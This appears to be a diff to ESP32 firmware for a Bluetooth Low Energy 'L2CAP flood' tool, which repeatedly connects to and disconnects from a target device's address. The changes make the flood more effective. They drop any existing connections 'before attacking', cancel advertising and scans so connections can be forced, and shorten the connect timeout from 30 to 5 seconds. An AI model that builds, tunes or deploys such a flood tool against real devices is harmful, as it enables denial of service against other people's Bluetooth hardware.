@@ -96,6 +96,7 @@
 // }
 
 // bool ble_l2cap_is_running(void) { return running; }
+
 /* BLE L2CAP flood - controlled connect/disconnect */
 #include "ble_l2cap_flood.h"
 #include "esp_log.h"
@@ -199,19 +200,25 @@ static int conn_cb(struct ble_gap_event *event, void *arg) {
 static void l2cap_task(void *arg) {
     ESP_LOGI(TAG, "L2CAP flood task started for %s", target);
 
+    /* Kill any existing BLE connections (e.g. phone) before attacking */
+    ble_common_disconnect_all();
+    vTaskDelay(pdMS_TO_TICKS(1000));
+
     while (running) {
-        /* Don't attempt connect if another GAP procedure is active */
+        /* Don't attempt connect if a connection is already active */
         if (ble_gap_conn_active()) {
             vTaskDelay(pdMS_TO_TICKS(200));
             continue;
         }
         if (ble_gap_adv_active()) {
+            /* Cancel advertising so we can connect */
+            ble_gap_adv_stop();
             vTaskDelay(pdMS_TO_TICKS(100));
-            continue;
         }
         if (ble_gap_disc_active()) {
-            vTaskDelay(pdMS_TO_TICKS(100));
-            continue;
+            /* Cancel any running scan (e.g. GATT probe) so we can connect */
+            ble_gap_disc_cancel();
+            vTaskDelay(pdMS_TO_TICKS(200));
         }
 
         /* Safely copy target address */
@@ -234,7 +241,7 @@ static void l2cap_task(void *arg) {
 
         uint8_t own_addr_type = ble_common_own_addr_type();
 
-        int rc = ble_gap_connect(own_addr_type, &peer, 30000,
+        int rc = ble_gap_connect(own_addr_type, &peer, 5000,
                                  &conn_params, conn_cb, NULL);
         if (rc != 0) {
             if (rc == BLE_HS_EALREADY) {
